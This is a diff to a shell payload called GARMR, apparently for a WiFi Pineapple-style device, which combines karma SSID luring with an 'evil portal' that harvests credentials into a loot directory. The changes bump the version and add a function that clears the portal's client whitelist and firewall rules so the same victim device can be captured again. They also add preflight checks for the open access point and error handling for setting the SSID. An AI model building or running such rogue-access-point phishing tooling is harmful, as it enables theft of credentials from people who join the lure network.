@@ -2,7 +2,7 @@
 # Title: GARMR - Karma + Evil Portal Combined
 # Description: SKOLL's karma luring + LOKI's credential harvesting in one payload
 # Author: HaleHound
-# Version: 4.7.0
+# Version: 4.7.2
 # Category: user/attack
 #
 # Named after the blood-stained hound that guards the gates of HALE
@@ -1136,6 +1136,23 @@ get_cred_count() {
     [ -f "$LOOT_DIR/credentials.txt" ] && wc -l < "$LOOT_DIR/credentials.txt" 2>/dev/null || echo 0
 }
 
+# === CLEAR WHITELIST (for testing) ===
+# Source: Hak5 official install_evil_portal payload
+# Files: /tmp/EVILPORTAL_CLIENTS.txt, /tmp/EVILPORTAL_PROCESSED.txt
+clear_whitelist() {
+    LOG "Clearing authorized clients whitelist..."
+
+    # Remove Evil Portal client files
+    rm -f /tmp/EVILPORTAL_CLIENTS.txt /tmp/EVILPORTAL_PROCESSED.txt
+
+    # Remove nft whitelist rules (ip saddr X.X.X.X accept)
+    /usr/sbin/nft -a list chain inet fw4 dstnat 2>/dev/null | grep "ip saddr.*accept" | awk '{print $NF}' | while read handle; do
+        /usr/sbin/nft delete rule inet fw4 dstnat handle "$handle" 2>/dev/null
+    done
+
+    LOG "Whitelist cleared"
+}
+
 # ============================================================================
 # MAIN EXECUTION
 # ============================================================================
@@ -1145,7 +1162,7 @@ LOG "┏━┛┏━┃┏━┃┏┏ ┏━┃"
 LOG "┃ ┃┏━┃┏┏┛┃┃┃┏┏┛"
 LOG "━━┛┛ ┛┛ ┛┛┛┛┛ ┛"
 LOG ""
-LOG "       GARMR v4.7.0"
+LOG "       GARMR v4.7.2"
 LOG ""
 
 led_setup
@@ -1168,6 +1185,13 @@ if check_garmr_active; then
 
     if [ "$stop_choice" = "1" ]; then
         deactivate_portal
+
+        # Ask if user wants to clear whitelist (for testing)
+        clear_choice=$(CONFIRMATION_DIALOG "Clear authorized clients?\n\n(For testing - lets you\ncapture same device again)\n\nYES = Clear whitelist\nNO = Keep whitelist")
+        if [ "$clear_choice" = "1" ]; then
+            clear_whitelist
+        fi
+
         led_success
         VIBRATE
         ALERT "GARMR STOPPED\n\nPortal deactivated.\nLoot: $LOOT_DIR"
@@ -1303,11 +1327,27 @@ if [ "$confirm" != "1" ]; then
     exit 0
 fi
 
+# === PREFLIGHT: CHECK wlan0open EXISTS ===
+LOG ""
+LOG "=== PREFLIGHT CHECK ==="
+if ! uci get wireless.wlan0open >/dev/null 2>&1; then
+    led_error
+    ERROR_DIALOG "Open AP not configured!\n\nGo to:\nPineAP > Open AP > Enable\n\nThen run GARMR again."
+    LOG "ERROR: wlan0open interface not found"
+    exit 1
+fi
+LOG "Open AP: OK"
+
 # === STEP 1: SET SSID (SKOLL) ===
 LOG ""
 LOG "=== SETTING SSID ==="
 led_network
-set_broadcast_ssid "$SELECTED_SSID"
+if ! set_broadcast_ssid "$SELECTED_SSID"; then
+    led_error
+    ERROR_DIALOG "Failed to set SSID!\n\nCheck wireless config."
+    LOG "ERROR: Could not set SSID to $SELECTED_SSID"
+    exit 1
+fi
 
 # === STEP 2: INSTALL PORTAL (LOKI) ===
 LOG ""
@@ -1388,7 +1428,7 @@ LOG "========================"
 LOG ""
 LOG "SSID: $SELECTED_SSID"
 LOG "Portal: $SELECTED_PORTAL"
-LOG "Karma: ${#COMMON_SSIDS[@]} SSIDs"
+LOG "Karma: ${#ALL_KARMA_SSIDS[@]} SSIDs"
 LOG ""
 LOG "Loot: $LOOT_DIR"
 LOG ""
